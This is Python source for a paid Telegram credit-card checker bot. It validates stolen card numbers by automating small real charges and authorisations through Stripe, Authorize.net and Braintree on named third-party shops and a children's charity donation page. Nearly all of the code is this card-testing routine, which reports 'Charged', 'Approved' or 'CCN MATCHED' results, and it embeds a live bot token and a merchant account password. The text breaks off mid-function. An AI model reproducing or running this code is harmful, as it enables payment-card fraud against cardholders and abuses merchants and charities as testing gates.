import os
import re
import string
import random
import threading
import asyncio
import requests
import time
import base64
import json
import uuid
from groq import Groq
from datetime import datetime, timedelta
from colorama import init, Fore, Style
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import ApplicationBuilder, CommandHandler, CallbackQueryHandler, ContextTypes, MessageHandler, filters

init()

bot_token = '8185513909:AAEFEjHZDrfjIXLmMnkiFAhd3z0157pHHuE'

admin_ids = [7334648572]
owner_ids = [7334648572]

plans = {
    "Nano Pass": {"duration": timedelta(days=1), "price": "$1.99 / ₹165"},
    "Lite Access": {"duration": timedelta(days=7), "price": "$6.99 / ₹580"},
    "Basic Boost": {"duration": timedelta(days=30), "price": "$12.99 / ₹1,080"},
    "Premium Plus": {"duration": timedelta(days=90), "price": "$29.99 / ₹2,500"},
    "Elite Pro": {"duration": timedelta(days=180), "price": "$39.99 / ₹3,350"},
    "Contact": {"owner": "@kimm_junggg", "second_owner": "@BaignX", "note": "**FOR PURCHASING CONTACT OWNER @kimm_junggg OR SECOND OWNER @BaignX**"}
}

os.makedirs('data', exist_ok=True)
os.makedirs('data/subscriptions', exist_ok=True)
os.makedirs('data/keys', exist_ok=True)
os.makedirs('data/banned_users', exist_ok=True)
os.makedirs('data/registered_users', exist_ok=True)

def funca():
    return ''.join(random.choice(string.ascii_lowercase) for _ in range(8))

def get_bin_info(bin_number):
    url = f"https://lookup.binlist.net/{bin_number}"
    headers = {
        "Accept-Version": "3"
    }

    response = requests.get(url, headers=headers)

    if response.status_code == 200:
        data = response.json()
        return {
            "Scheme": data.get("scheme"),
            "Type": data.get("type"),
            "Brand": data.get("brand"),
            "Bank": data.get("bank", {}).get("name"),
            "Country": data.get("country", {}).get("name"),
        }
    else:
        return {"error": "Invalid BIN or request limit exceeded"}

def generate_user_agent():
    return 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36'

def generate_random_account():
    return ''.join(random.choices(string.ascii_lowercase, k=10)) + ''.join(random.choices(string.digits, k=4)) + '@yahoo.com'

def generate_username():
    return ''.join(random.choices(string.ascii_lowercase, k=10)) + ''.join(random.choices(string.digits, k=10))

def generate_random_code(length=32):
    return ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(length))

def check_stripe_charge(combo):
    r = requests.Session()
    if len(combo) != 4:
        return "Invalid input format. Use cc|mm|yy|cvv."
    cc, mm, yy, cvv = combo
    mm = mm.zfill(2)
    yy = yy[-2:]
    try:
        start_time = time.time()
        user = generate_user_agent()
        acc = generate_random_account()
        username = generate_username()
        corr = generate_random_code()
        sess = generate_random_code()

        headers = {
            'authority': 'needhelped.com',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'user-agent': user,
        }

        r0 = r.get('https://needhelped.com/campaigns/poor-children-donation-4/donate/', cookies=r.cookies, headers=headers)
        nonce_match = re.search(r'name="_charitable_donation_nonce" value="([^"]+)"', r0.text)
        nonce = nonce_match.group(1) if nonce_match else None

        if not nonce:
            return "Failed to get nonce."

        headers = {
            'authority': 'api.stripe.com',
            'accept': 'application/json',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'referer': 'https://js.stripe.com/',
            'user-agent': user,
        }

        data = f'type=card&billing_details[name]=Test User&billing_details[email]={acc}&card[number]={cc}&card[cvc]={cvv}&card[exp_month]={mm}&card[exp_year]={yy}&key=pk_live_51NKtwILNTDFOlDwVRB3lpHRqBTXxbtZln3LM6TrNdKCYRmUuui6QwNFhDXwjF1FWDhr5BfsPvoCbAKlyP6Hv7ZIz00yKzos8Lr'

        r1 = r.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)

        if r1.status_code != 200 or 'id' not in r1.json():
            end_time = time.time()
            elapsed_time = end_time - start_time
            info, issuer, country = get_bin_info(cc).get("Scheme"), get_bin_info(cc).get("Brand"), get_bin_info(cc).get("Country")
            return (
                f"DECLINED ❌\n\n"
                f"𝗖𝗮𝗿𝗱: {cc}|{mm}|{yy}|{cvv}\n"
                f"𝐆𝐚𝐭𝐞 𝐂𝐇𝐀𝐑𝐆𝐄: STRIPE 1$ CHARGE\n"
                f"𝗥𝗉𝘀𝗉𝗈𝗇𝘀𝗉: {r1.json().get('error', {}).get('message', 'Unknown error')}\n\n"
                f"𝗜𝗻𝗳𝗼: {info}\n"
                f"𝐈𝐬𝐬𝐮𝐞𝐫: {issuer}\n"
                f"𝐂𝐨𝐮𝐧𝐭𝐫𝐲: {country}\n\n"
                f"𝗧𝗶𝗺𝗲: {elapsed_time:.2f}s"
            )

        payment_method_id = r1.json()['id']

        headers['authority'] = 'needhelped.com'
        headers['content-type'] = 'application/x-www-form-urlencoded; charset=UTF-8'
        headers['referer'] = 'https://needhelped.com/campaigns/poor-children-donation-4/donate/'

        data = {
            '_charitable_donation_nonce': nonce,
            'campaign_id': '1164',
            'description': 'Donation',
            'donation_amount': 'custom',
            'custom_donation_amount': '1.00',
            'first_name': 'Test',
            'last_name': 'User',
            'email': acc,
            'gateway': 'stripe',
            'stripe_payment_method': payment_method_id,
            'action': 'make_donation',
        }

        r2 = r.post('https://needhelped.com/wp-admin/admin-ajax.php', cookies=r.cookies, headers=headers, data=data)

        response_json = r2.json()
        end_time = time.time()
        elapsed_time = end_time - start_time
        info, issuer, country = get_bin_info(cc).get("Scheme"), get_bin_info(cc).get("Brand"), get_bin_info(cc).get("Country")

        if response_json.get("requires_action") and response_json.get("success") and "redirect_to" in response_json:
            return (
                f"Charged 1$ 🔥\n\n"
                f"𝗖𝗮𝗿𝗱: {cc}|{mm}|{yy}|{cvv}\n"
                f"𝐆𝐚𝐭𝐞 𝐂𝐇𝐀𝐑𝐆𝐄: STRIPE 1$ CHARGE\n"
                f"𝗥𝗉𝘀𝗉𝗈𝗇𝘀𝗉: Payment successful\n\n"
                f"𝗜𝗻𝗳𝗼: {info}\n"
                f"𝐈𝐬𝐬𝐮𝐞𝐫: {issuer}\n"
                f"𝐂𝐨𝐮𝐧𝐭𝐫𝐲: {country}\n\n"
                f"𝗧𝗶𝗺𝗲: {elapsed_time:.2f}s"
            )
        else:
            return (
                f"DECLINED ❌\n\n"
                f"𝗖𝗮𝗿𝗱: {cc}|{mm}|{yy}|{cvv}\n"
                f"𝐆𝐚𝐭𝐞 𝐂𝐇𝐀𝐑𝐆𝐄: STRIPE 1$ CHARGE\n"
                f"𝗥𝗉𝘀𝗉𝗈𝗇𝘀𝗉: {response_json.get('errors', 'Transaction failed')}\n\n"
                f"𝗜𝗻𝗳𝗼: {info}\n"
                f"𝐈𝐬𝐬𝐮𝐞𝐫: {issuer}\n"
                f"𝐂𝐨𝐮𝐧𝐭𝐫𝐲: {country}\n\n"
                f"𝗧𝗶𝗺𝗲: {elapsed_time:.2f}s"
            )
    except requests.exceptions.RequestException as e:
        return f"DECLINED ❌\n\n𝗖𝗮𝗿𝗱: {cc}|{mm}|{yy}|{cvv}\n𝐆𝐚𝐭𝐞 𝐂𝐇𝐀𝐑𝐆𝐄: STRIPE 1$ CHARGE\n𝗥𝗉𝘀𝗉𝗈𝗇𝘀𝗉: {str(e)}\n\n𝗜𝗻𝗳𝗼: {get_bin_info(cc).get('Scheme')}\n𝐈𝐬𝐬𝐮𝐞𝐫: {get_bin_info(cc).get('Brand')}\n𝐂𝐨𝐮𝐧𝐭𝐫𝐲: {get_bin_info(cc).get('Country')}"

def check_authorized_charge(combo):
    r = requests.Session()
    if len(combo) != 4:
        return "Invalid input format. Use cc|mm|yy|cvv."
    cc, mm, yy, cvv = combo
    mm = mm.zfill(2)
    yy = yy[-2:]
    try:
        user = generate_user_agent()
        acc = generate_random_account()
        username = generate_username()
        corr = generate_random_code()
        zip = random.randint(10000, 99999)

        headers = {
            "Accept": "*/*",
            "Accept-Language": "en-US,en;q=0.9",
            "Connection": "keep-alive",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "Origin": "https://store.moananursery.com",
            "Referer": "https://store.moananursery.com/inet/storefront/gift_cards.php?mode=purchase&id=1",
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "same-origin",
            "Sec-Fetch-User": "?1",
            "User-Agent": user,
            "X-Requested-With": "XMLHttpRequest",
            "sec-ch-ua": '"Not A(Brand";v="8", "Chromium";v="132"',
            "sec-ch-ua-mobile": "?1",
            "sec-ch-ua-platform": '"Android"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "sec-fetch-user": "?1",
            "user-agent": user,
        }

        data = {
            "gift_card_purchase_price": "5",
            "gift_card_id": "1",
            "key": "",
            "mode": "add_to_order",
            "gift_card_price_other_list": "5",
            "to_name": "Gggtt",
            "to_email": "Jjuuu818@gmail.com",
            "from_name": "Hhgggghgg",
            "message_text": "Baign Kumar, Bshd",
        }

        r1 = r.post(
            "https://store.moananursery.com/inet/storefront/gift_cards.php/",
            cookies=r.cookies,
            headers=headers,
            data=data,
        )

        headers = {
            "Accept": "application/json, text/javascript, */*; q=0.01",
            "Accept-Language": "en-US,en;q=0.9",
            "Connection": "keep-alive",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "Origin": "https://store.moananursery.com",
            "Referer": "https://store.moananursery.com/inet/storefront/gift_cards.php?mode=checkout",
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "same-origin",
            "User-Agent": user,
            "X-Requested-With": "XMLHttpRequest",
            "sec-ch-ua": '"Not A(Brand";v="8", "Chromium";v="132"',
            "sec-ch-ua-mobile": "?1",
            "sec-ch-ua-platform": '"Android"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "user-agent": user,
        }

        params = {
            "mode": "checkout",
        }

        data = {
            "inet_gateway": "authorizenetaccept",
            "mode": "process_checkout",
            "ach": "N",
            "set_payment_method": "authorizenetaccept",
            "address_type": "manual",
            "address_info[name]": " ",
            "address_info[fname]": "Baign",
            "address_info[lname]": "Raja",
            "address_info[email]": "Jjuuu818@gmail.com",
            "address_info[phone]": "8473614926",
            "address_info[address1]": "32300 116th St",
            "address_info[address2]": "",
            "address_info[city]": "Wilmot",
            "address_info_country": "US",
            "address_info_province": "WI",
            "address_info[postalcode]": zip,
            "po_number": "",
        }

        r2 = r.post(
            "https://store.moananursery.com/inet/storefront/gift_cards.php",
            params=params,
            cookies=r.cookies,
            headers=headers,
            data=data,
        )

        token = r2.json()["token"]

        headers = {
            "authority": "accept.authorize.net",
            "accept": "application/json",
            "accept-language": "en-US,en;q=0.9",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "origin": "https://accept.authorize.net",
            "referer": "https://accept.authorize.net/payment/payment",
            "sec-ch-ua": '"Not A(Brand";v="8", "Chromium";v="132"',
            "sec-ch-ua-mobile": "?1",
            "sec-ch-ua-platform": '"Android"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-site",
            "user-agent": user,
        }

        data = {
            "token": token,
            "totalAmount": "5.00",
            "paymentMethod": "cc",
            "creditCard": cc,
            "expirationDate": f"{mm}/{yy}",
            "cardCode": cvv,
            "billingInfo[zip]": zip,
        }

        r3 = r.post(
            "https://accept.authorize.net/Payment/Api.ashx",
            cookies=r.cookies,
            headers=headers,
            data=data,
        )
        if r3.json()["resultCode"] == "Error":
            if "AVS mismatch" in r3.text:
                status = r3.json()["messageText"]
                result_code = r3.json()["messageCode"]
            else:
                status = r3.json()["messageText"]
                result_code = r3.json()["messageCode"]
        else:
            status = r3.json()
            result_code = None

        info, issuer, country = get_bin_info(cc).get("Scheme"), get_bin_info(cc).get("Brand"), get_bin_info(cc).get("Country")
        return (
            f"DECLINED ❌\n\n"
            f"𝗖𝗮𝗿𝗱: {cc}|{mm}|{yy}|{cvv}\n"
            f"𝐆𝐚𝐭𝐞 𝐂𝐇𝐀𝐑𝐆𝐄: Authorized.net 5$ CHARGE\n"
            f"𝗥𝗉𝘀𝗉𝗈𝗇𝘀𝗉: {status}\n\n"
            f"𝗜𝗻𝗳𝗼: {info}\n"
            f"𝐈𝐬𝐬𝐮𝐞𝐫: {issuer}\n"
            f"𝐂𝐨𝐮𝐧𝐭𝐫𝐲: {country}\n\n"
        )
    except requests.exceptions.RequestException as e:
        return f"DECLINED ❌\n\n𝗖𝗮𝗿𝗱: {cc}|{mm}|{yy}|{cvv}\n𝐆𝐚𝐭𝐞 𝐂𝐇𝐀𝐑𝐆𝐄: Authorized.net 5$ CHARGE\n𝗥𝗉𝘀𝗉𝗈𝗇𝘀𝗉: {str(e)}\n\n𝗜𝗻𝗳𝗼: {get_bin_info(cc).get('Scheme')}\n𝐈𝐬𝐬𝐮𝐞𝐫: {get_bin_info(cc).get('Brand')}\n𝐂𝐨𝐮𝐧𝐭𝐫𝐲: {get_bin_info(cc).get('Country')}"

def check_stripe_auth(combo):
    r = requests.Session()
    if len(combo) != 4:
        return "Invalid input format. Use cc|mm|yy|cvv."
    cc, mm, yy, cvv = combo
    mm = mm.zfill(2)
    yy = yy[-2:]
    try:
        start_time = time.time()
        username = funca()
        email = username + "@yahoo.com"
        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'accept-language': 'en-US,en;q=0.9',
            'priority': 'u=0, i',
            'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132", "Google Chrome";v="132"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'none',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
        }

        response = r.get('https://truesignage.co.uk/my-account/add-payment-method/', headers=headers)
        registernonce = re.search(r'name="woocommerce-register-nonce" value="([a-z0-9]+)"', response.text).group(1)

        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'accept-language': 'en-US,en;q=0.9',
            'cache-control': 'max-age=0',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://truesignage.co.uk',
            'priority': 'u=0, i',
            'referer': 'https://truesignage.co.uk/my-account/add-payment-method/',
            'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132", "Google Chrome";v="132"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
        }
        data = {
            'email': email,
            'email_2': '',
            'woocommerce-register-nonce': registernonce,
            '_wp_http_referer': '/my-account/add-payment-method/',
            'register': 'Register',
        }

        response = r.post('https://truesignage.co.uk/my-account/add-payment-method/', cookies=r.cookies, headers=headers, data=data)
        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'accept-language': 'en-US,en;q=0.9',
            'cache-control': 'max-age=0',
            'priority': 'u=0, i',
            'referer': 'https://truesignage.co.uk/my-account/add-payment-method/?_wc_user_reg=true',
            'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132", "Google Chrome";v="132"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
        }
        response = r.get('https://truesignage.co.uk/my-account/add-payment-method/?_wc_user_reg=true', headers=headers, cookies=r.cookies)
        addcardnonce = re.search(r'"add_card_nonce":"([a-z0-9]+)"', response.text).group(1)

        headers = {
            'accept': 'application/json',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'priority': 'u=1, i',
            'referer': 'https://js.stripe.com/',
            'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132", "Google Chrome";v="132"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
        }
        data = f'referrer=https%3A%2F%2Ftruesignage.co.uk&type=card&owner[name]=+&owner[email]=idontlikeboys%40gmail.com&card[number]={cc}&card[cvc]={cvv}&card[exp_month]={mm}&card[exp_year]={yy}&guid=38d42be9-3411-4d87-af5f-52ef7a82890826b21b&muid=ae933eb7-4a34-423f-8656-40c9ba4eeb21b0126e&sid=66aafd40-a078-4e62-acf7-593ae7390db5e6e28e&pasted_fields=number&payment_user_agent=stripe.js%2Fc93000e12a%3B+stripe-js-v3%2Fc93000e12a%3B+split-card-element&time_on_page=30030&key=pk_live_51LFabqJxahCuwhEcz8b3l7974Bw3iSwXFzgwK5pJrxnW1DXXYmHtUUW8HZW59xS1zNAITm6l3URpG2ghKzk8BDjG00yjqwbi93'
        response = requests.post('https://api.stripe.com/v1/sources', headers=headers, data=data)
        j = response.json()
        if 'id' in j:
            id = j['id']
        elif 'error' in j:
            msg = j['error']['message']
            end_time = time.time()
            elapsed_time = end_time - start_time
            info, issuer, country = get_bin_info(cc).get("Scheme"), get_bin_info(cc).get("Brand"), get_bin_info(cc).get("Country")
            return (
                f"DECLINED ❌\n\n"
                f"𝗖𝗮𝗿𝗱: {cc}|{mm}|{yy}|{cvv}\n"
                f"𝐆𝐚𝐭𝐞 𝐀𝐮𝐭𝐡: Stripe Auth\n"
                f"𝗥𝗉𝘀𝗉𝗈𝗇𝘀𝗉: {msg}\n\n"
                f"𝗜𝗻𝗳𝗼: {info}\n"
                f"𝐈𝐬𝐬𝐮𝐞𝐫: {issuer}\n"
                f"𝐂𝐨𝐮𝐧𝐭𝐫𝐲: {country}\n\n"
                f"𝗧𝗶𝗺𝗲: {elapsed_time:.2f}s"
            )
        else:
            return f"{Fore.YELLOW}[?] {cc}|{mm}|{yy}|{cvv} id not found{Fore.RESET}"

        headers = {
            'accept': 'application/json, text/javascript, */*; q=0.01',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': 'https://truesignage.co.uk',
            'priority': 'u=1, i',
            'referer': 'https://truesignage.co.uk/my-account/add-payment-method/?_wc_user_reg=true',
            'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132", "Google Chrome";v="132"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
            'x-requested-with': 'XMLHttpRequest',
        }
        data = {
            'stripe_source_id': id,
            'nonce': addcardnonce,
        }
        response = r.post('https://truesignage.co.uk/?wc-ajax=wc_stripe_create_setup_intent', cookies=r.cookies, headers=headers, data=data)
        msg = response.json()
        end_time = time.time()
        elapsed_time = end_time - start_time
        info, issuer, country = get_bin_info(cc).get("Scheme"), get_bin_info(cc).get("Brand"), get_bin_info(cc).get("Country")
        if msg.get('status') == 'success':
            return (
                f"Approved ✅\n\n"
                f"𝗖𝗮𝗿𝗱: {cc}|{mm}|{yy}|{cvv}\n"
                f"𝐆𝐚𝐭𝐞 𝐀𝐮𝐭𝐡: Stripe Auth\n"
                f"𝗥𝗉𝘀𝗉𝗈𝗇𝘀𝗉: {msg}\n\n"
                f"𝗜𝗻𝗳𝗼: {info}\n"
                f"𝐈𝐬𝐬𝐮𝐞𝐫: {issuer}\n"
                f"𝐂𝐨𝐮𝐧𝐭𝐫𝐲: {country}\n\n"
                f"𝗧𝗶𝗺𝗲: {elapsed_time:.2f}s"
            )
        elif msg.get('status') == 'requires_action':
            return (
                f"3DS Approved ✅\n\n"
                f"𝗖𝗮𝗿𝗱: {cc}|{mm}|{yy}|{cvv}\n"
                f"𝐆𝐚𝐭𝐞 𝐀𝐮𝐭𝐡: Stripe Auth\n"
                f"𝗥𝗉𝘀𝗉𝗈𝗇𝘀𝗉: {msg}\n\n"
                f"𝗜𝗻𝗳𝗼: {info}\n"
                f"𝐈𝐬𝐬𝐮𝐞𝐫: {issuer}\n"
                f"𝐂𝐨𝐮𝐧𝐭𝐫𝐲: {country}\n\n"
                f"𝗧𝗶𝗺𝗲: {elapsed_time:.2f}s"
            )
        elif msg.get('status') == 'error' and "Your card's security code is invalid" in msg.get('message'):
            return (
                f"CCN MATCHED ✅\n\n"
                f"𝗖𝗮𝗿𝗱: {cc}|{mm}|{yy}|{cvv}\n"
                f"𝐆𝐚𝐭𝐞 𝐀𝐮𝐭𝐡: Stripe Auth\n"
                f"𝗥𝗉𝘀𝗉𝗈𝗇𝘀𝗉: {msg}\n\n"
                f"𝗜𝗻𝗳𝗼: {info}\n"
                f"𝐈𝐬𝐬𝐮𝐞𝐫: {issuer}\n"
                f"𝐂𝐨𝐮𝐧𝐭𝐫𝐲: {country}\n\n"
                f"𝗧𝗶𝗺𝗲: {elapsed_time:.2f}s"
            )
        elif msg.get('status') == 'error':
            e = msg['error']['message']
            return (
                f"DECLINED ❌\n\n"
                f"𝗖𝗮𝗿𝗱: {cc}|{mm}|{yy}|{cvv}\n"
                f"𝐆𝐚𝐭𝐞 𝐀𝐮𝐭𝐡: Stripe Auth\n"
                f"𝗥𝗉𝘀𝗉𝗈𝗇𝘀𝗉: {e}\n\n"
                f"𝗜𝗻𝗳𝗼: {info}\n"
                f"𝐈𝐬𝐬𝐮𝐞𝐫: {issuer}\n"
                f"𝐂𝐨𝐮𝐧𝐭𝐫𝐲: {country}\n\n"
                f"𝗧𝗶𝗺𝗲: {elapsed_time:.2f}s"
            )
        else:
            return (
                f"Unknown Status ❓\n\n"
                f"𝗖𝗮𝗿𝗱: {cc}|{mm}|{yy}|{cvv}\n"
                f"𝐆𝐚𝐭𝐞 𝐀𝐮𝐭𝐡: Stripe Auth\n"
                f"𝗥𝗉𝘀𝗉𝗈𝗇𝘀𝗉: {msg}\n\n"
                f"𝗜𝗻𝗳𝗼: {info}\n"
                f"𝐈𝐬𝐬𝐮𝐞𝐫: {issuer}\n"
                f"𝐂𝐨𝐮𝐧𝐭𝐫𝐲: {country}\n\n"
                f"𝗧𝗶𝗺𝗲: {elapsed_time:.2f}s"
            )
    except requests.exceptions.RequestException as e:
        return f"DECLINED ❌\n\n𝗖𝗮𝗿𝗱: {cc}|{mm}|{yy}|{cvv}\n𝐆𝐚𝐭𝐞 𝐀𝐮𝐭𝐡: Stripe Auth\n𝗥𝗉𝘀𝗉𝗈𝗇𝘀𝗉: {str(e)}\n\n𝗜𝗻𝗳𝗼: {get_bin_info(cc).get('Scheme')}\n𝐈𝐬𝐬𝐮𝐞𝐫: {get_bin_info(cc).get('Brand')}\n𝐂𝐨𝐮𝐧𝐭𝐫𝐲: {get_bin_info(cc).get('Country')}"

def parseX(data, start, end):
    try:
        star = data.index(start) + len(start)
        last = data.index(end, star)
        return data[star:last]
    except ValueError:
        return "None"

def check_braintree_charge(combo):
    r = requests.Session()
    if len(combo) != 4:
        return "Invalid input format. Use cc|mm|yy|cvv."
    cc, mm, yy, cvv = combo
    mm = mm.zfill(2)
    yy = yy[-2:]
    try:
        start_time = time.time()
        user = generate_user_agent()
        acc = generate_random_account()
        username = generate_username()
        corr = generate_random_code()
        sess = generate_random_code()

        headers = {
            'authority': 'www.bebebrands.com',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9',
            'cache-control': 'max-age=0',
            'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'none',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': user,
        }

        req = r.get('https://www.bebebrands.com/my-account/', headers=headers)

        nonce = re.search(r'id="woocommerce-login-nonce" value="(.*?)"', req.text).group(1)

        headers = {
            'authority': 'www.bebebrands.com',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9',
            'cache-control': 'max-age=0',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://www.bebebrands.com',
            'referer': 'https://www.bebebrands.com/my-account/',
            'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'none',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': user,
        }

        data = {
            'username': 'Jjuuu818@gmail.com',
            'password': 'God@111983',
            'woocommerce-login-nonce': nonce,
            '_wp_http_referer': '/my-account/',
            'login': 'Log in',
        }

        req = r.post('https://www.bebebrands.com/my-account/', cookies=r.cookies, headers=headers, data=data)

        headers = {
            'authority': 'www.bebebrands.com',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9',
            'referer': 'https://www.bebebrands.com/my-account/',
            'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'none',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': user,
        }

        req = r.get('https://www.bebebrands.com/my-account/payment-methods/', cookies=r.cookies, headers=headers)

        headers = {
            'authority': 'www.bebebrands.com',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9',
            'referer': 'https://www.bebebrands.com/my-account/payment-methods/',
            'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'none',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': user,
        }

        req = r.get('https://www.bebebrands.com/my-account/add-payment-method/', cookies=r.cookies, headers=headers)

        client_token = parseX(req.text, '"client_token_nonce":"', '"')
        noncec = parseX(req.text, '<input type="hidden" id="woocommerce-add-payment-method-nonce" name="woocommerce-add-payment-method-nonce" value="', '" />')

        headers = {
            'authority': 'www.bebebrands.com',
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': 'https://www.bebebrands.com',
            'referer': 'https://www.bebebrands.com/my-account/add-payment-method/',
            'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': user,
        }

        params = {
            'action': 'wc_braintree_credit_card_get_client_token',
            'nonce': client_token,
        }

        req = r.post('https://www.bebebrands.com/wp-admin/admin-ajax.php', cookies=r.cookies, headers=headers, data=params)

        token = req.json()['data']
        token = json.loads(base64.b64decode(token))['authorizationFingerprint']

        headers = {
            'authority': 'payments.braintreegateway.com',
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            'authorization': f'Bearer {token}',
            'braintree-version': '2018-05-10',
            'content-type': 'application/json',
            'origin': 'https://assets.braintreegateway.com',
            'referer': 'https://assets.braintreegateway.com/',
            'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'cross-site',
            'user-agent': user,
        }

        json_data = {
            'clientSdkMetadata': {
                'source': 'client',
                'integration': 'custom',
                'sessionId': str(uuid.uuid4()),
            },
